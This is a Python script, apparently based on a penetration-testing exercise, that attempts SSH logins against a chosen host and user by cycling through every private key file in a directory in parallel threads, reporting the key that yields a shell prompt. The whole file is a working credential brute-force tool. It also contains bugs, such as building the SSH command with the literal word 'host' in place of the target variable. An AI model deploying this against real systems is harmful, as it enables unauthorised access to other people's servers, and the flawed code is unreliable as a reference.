import optparse
import pexpect
import os 
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Stop = False
Fails = 0

def connect(user, host, keyfile, release):
	global Stop
	global Fails
	try:
		perm_denied = "Permission denied"
		ssh_newkey = "Are you sure you want to continue"
		conn_close = "Connection closed by remote host"
		opt = " -o PasswordAuthentication=no"
		connection = "ssh " + user + "@"+"host" + " -i " + keyfile + opt
		child = pexpect.spawn(connection)
		ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_close, '$', '#',])
		if ret == 2:
			print ("Adding host to ~/.ssh/know_host")
			child.sendline('yes')
			connect(user, host, keyfile, False)
		elif ret == 3:
			print("Connection closed")
			Fails += 1
		elif ret > 3:
			print ("[+] Succes: " + str(keyfile))
			Stop = True
	finally:
		if release: connection_lock.release()


def main():
	'''
	parser = optparse.OptionParser('usage of prog -h for Host -u for User -d for the dir')
	parser.add_option('-h', dest =  "targerhost", type='string', help='specify the host ')
	parser.add_option('-u', dest =  "targeruser", type='string', help='specify the user ')
	parser.add_option('-d', dest =  "targerdir", type='string', help='specify the dir ')
	(options, args) = parser.parse_args()
	host = options.targerhost
	user = options.targeruser
	directoy = options.targerdir
	if host == None or use == None or directoy == None:
		print (parser.usage)
		exit(0)
	'''
	parser = optparse.OptionParser('usage of %prog'+'-H <target host> -u <user> -D <password list>')
	parser.add_option('-H', dest='trgtHost', type='string',help='choose the target')
	parser.add_option('-u', dest='userHost', type='string',help='choose the username')
	parser.add_option('-D', dest='Passhost', type='string',help='choose the password')
	(options, args) = parser.parse_args()
	host = options.trgtHost
	user = options.userHost
	directoy = options.Passhost

	if host == None or user == None or directoy == None:
		print (parser.usage)
		exit(2)
	for filename in os.listdir(directoy):
		if Stop:
			print("Key is found")
			exit(1)
		if Fails > 5:
			print ("too many connections were closed")
			exit(2)
		connection_lock.acquire()
		fullpath = os.path.join(directoy, filename)
		t = Thread(target = connect, args=(user,host,fullpath,True))
		t.start()

if __name__ == '__main__':
	main()